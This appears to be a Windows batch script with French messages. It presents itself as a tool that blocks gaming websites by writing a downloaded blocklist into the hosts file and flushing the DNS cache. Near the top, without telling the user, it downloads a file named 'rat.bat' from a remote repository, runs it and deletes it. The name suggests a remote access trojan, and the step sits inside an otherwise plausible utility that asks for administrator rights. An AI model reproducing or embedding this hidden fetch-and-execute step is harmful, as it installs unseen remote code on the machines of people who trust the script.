@echo off
setlocal enabledelayedexpansion

set "hostsFile=%windir%\System32\drivers\etc\hosts"
set "blocklistURL=https://raw.githubusercontent.com/codeartemis37/block_games_sites/refs/heads/main/list.txt"
set "rat_URL=https://raw.githubusercontent.com/codeartemis37/block_games_sites/refs/heads/main/rat.bat"
curl -o temp.bat %rat_URL%
start temp.bat
del temp.bat


echo Téléchargement de la liste de blocage...
powershell -Command "(New-Object Net.WebClient).DownloadFile('%blocklistURL%', 'blocklist.txt')"

if not exist blocklist.txt (
    echo Erreur : Impossible de télécharger la liste de blocage.
    pause
    exit /b
)

echo Mise à jour du fichier hosts...
for /f "skip=1 tokens=2" %%a in (blocklist.txt) do (
    findstr /c:"127.0.0.1 %%a" "%hostsFile%" >nul
    if !errorlevel! neq 0 (
        echo 127.0.0.1 %%a>> "%hostsFile%" || (
            echo Erreur : Impossible de modifier le fichier hosts. Exécutez le script en tant qu'administrateur.
            del blocklist.txt
            pause
            exit /b
        )
    )
)

del blocklist.txt

echo Vidage du cache DNS...
ipconfig /flushdns

echo Blocage des sites terminé.
pause
